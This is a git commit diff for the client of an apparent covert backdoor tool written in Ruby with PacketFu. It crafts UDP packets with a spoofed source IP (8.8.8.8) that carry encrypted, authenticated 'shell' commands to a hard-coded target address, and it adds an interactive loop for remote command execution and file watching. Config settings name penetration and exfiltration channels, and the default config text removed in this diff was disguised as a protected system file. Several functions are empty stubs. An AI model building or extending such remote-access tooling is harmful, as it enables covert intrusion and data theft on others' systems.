39b739262e0fdd0c571d6eeb0ce24b700d319860
Chris Wood <chriswood.ca@gmail.com>
2014-06-14 16:11:16 -0700

    Client command parsing loop

--- client.rb
+++ client.rb
@@ -24,15 +24,14 @@
 
 require 'packetfu'
 require 'openssl'
+require 'readline'
 require_relative 'util.rb'
 
 ## Variables
 
-## Functions
-
 ## Application Strings
 CONFIG_FILE = "client.conf"
-CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
+CONFIG_FILE_DEFAULT = "\# Make sure these settings match the server settings\n"
 CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
 CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
 CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
@@ -41,24 +40,64 @@ CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
 CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
 CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
 CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
+CMD_REGEX = /^(echidna) (shell|watch) .+$/
 
+## Functions
+
+def udp_test
+  config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> IF_DEV)).config
+  udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
+
+
+  #udp_pkt.eth_saddr = 
+  #udp_pkt.eth_daddr = b8:ac:6f:34:ad:d8
+  udp_pkt.udp_dst = 8668
+  udp_pkt.udp_src = rand(0xffff)
+  udp_pkt.ip_saddr = "8.8.8.8"
+  udp_pkt.ip_daddr = "142.232.107.31"
+  udp_pkt.payload = encrypt("#{AUTH_STRING} shell ls")
+  #check that commands have at least 3 split by space, sanitize inputs?
+  #udp_pkt.payload = "hello this is a test"
+  puts udp_pkt.payload.length
+
+  udp_pkt.recalc
+  udp_pkt.to_w "em1"
+end
+
+def listen_for_knock
+  
+end
+
+def start_receiving_server
+  
+end
+
+def start_command_loop
+  puts "+ enter a command (2 options)"
+  puts "+ shell |command|"
+  puts "+ watch |dir or file to watch|"
+  puts "+ \"ctrl + c\" to exit"
+  begin
+    loop {
+      input = Readline.readline('> ', true)  
+      words = input.split(' ')
+      case words[0]
+      when MODE_SHELL
+        puts "shell: #{words[1..-1].join(' ')}"
+      when MODE_WATCH
+        puts "watch: #{words[1..-1].join(' ')}"
+      else 
+        puts "Incorrect command format"
+      end
+      
+    }
+  rescue Interrupt
+    puts "ctrl+c received"
+  end
+end
 ## Main
 
-IF_DEV = "em1"
-config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> IF_DEV)).config
-udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
+#load config
+puts "+ Welcome to \"not a hacking\" program"
 
-
-#udp_pkt.eth_saddr = 
-#udp_pkt.eth_daddr = b8:ac:6f:34:ad:d8
-udp_pkt.udp_dst = 8668
-udp_pkt.udp_src = rand(0xffff)
-udp_pkt.ip_saddr = "8.8.8.8"
-udp_pkt.ip_daddr = "142.232.107.31"
-udp_pkt.payload = encrypt("#{AUTH_STRING} shell ls")
-#check that commands have at least 3 split by space, sanitize inputs?
-#udp_pkt.payload = "hello this is a test"
-puts udp_pkt.payload.length
-
-udp_pkt.recalc
-udp_pkt.to_w IF_DEV
+start_command_loop
